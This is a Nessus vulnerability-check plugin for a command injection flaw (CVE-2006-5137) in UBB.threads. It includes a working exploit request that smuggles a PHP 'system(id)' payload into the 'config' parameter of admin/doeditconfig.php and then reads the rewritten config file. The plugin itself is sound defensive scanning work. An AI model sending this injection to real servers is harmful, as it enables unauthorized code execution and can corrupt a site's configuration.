#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(22480);
  script_version("$Revision: 1.20 $");

  script_cve_id("CVE-2006-5137");
  script_bugtraq_id(20266);
  script_osvdb_id(32322);
  script_xref(name:"EDB-ID", value:"2457");

  script_name(english:"UBB.threads doeditconfig Arbitrary Command Injection");
  script_summary(english:"Tries to exploit an command injection flaw in UBB.threads");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows injection of
arbitrary PHP commands." );
 script_set_attribute(attribute:"description", value:
"The version of UBB.threads installed on the remote host fails to
sanitize input to the 'thispath' and 'config' parameters of the
'admin/doeditconfig.php' script before using them to update the
application's configuration file.  Provided PHP's 'register_globals'
setting is enabled, an unauthenticated attacker may be able to exploit
this flaw to modify configuration settings for the affected
application and even injecting arbitrary PHP code to be executed
whenever the config file is loaded.

The version installed is reported to be vulnerable to additional
issues, however, Nessus has not tested them." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?5b90f99d" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?0666a806" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?324c0824" );
 script_set_attribute(attribute:"solution", value:
"Either disable PHP's 'register_globals' setting or upgrade to
UBB.threads 6.5.5 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/09/30");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/09/30");
 script_cvs_date("$Date: 2015/09/24 23:21:21 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "ubbthreads_detect.nasl", "no404.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/ubbthreads");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);
if (get_kb_item("www/no404/" + port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/ubbthreads"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Try to exploit the flaw to create an alternate config file.
  #
  # nb: if subdir is "/includes" as in the published PoC, we trash the install!!!
  subdir = "/";

  # nb: PHP code injection works if magic_quotes is disabled
  cmd = "id";
  exploit = string('"; system(', cmd, ');"');

  r = http_send_recv3(method:"GET", port: port,
    item:string(
      dir, "/admin/doeditconfig.php?",
      "thispath=..", subdir, "&",
      "config[", SCRIPT_NAME, "]=", urlencode(str:exploit)));
  if (isnull(r)) exit(0);
  res = r[2];

  # Now grab the freshly-minted config file.
  r = http_send_recv3(method:"GET", item:string(dir, subdir, "/config.inc.php"), port:port);
  if (isnull(r)) exit(0);
  res = strcat(r[0], r[1], '\r\n', r[2]);

   # There's definitely a problem if we see command output.
  line = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res);
  if (line)
  {
    if (report_verbosity)
    {
      report = string(
        "\n",
        "Nessus was able to execute the command '", cmd, "' on the remote host.\n",
        "It produced the following output :\n",
        "\n",
        line
      );
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }

  # Otherwise, there's a problem if it exists and we're being paranoid.
  if (report_paranoia > 1 && egrep(string:res, pattern:"^HTTP/.* 200 OK"))
  {
    security_hole(port);
    exit(0);
  }
}
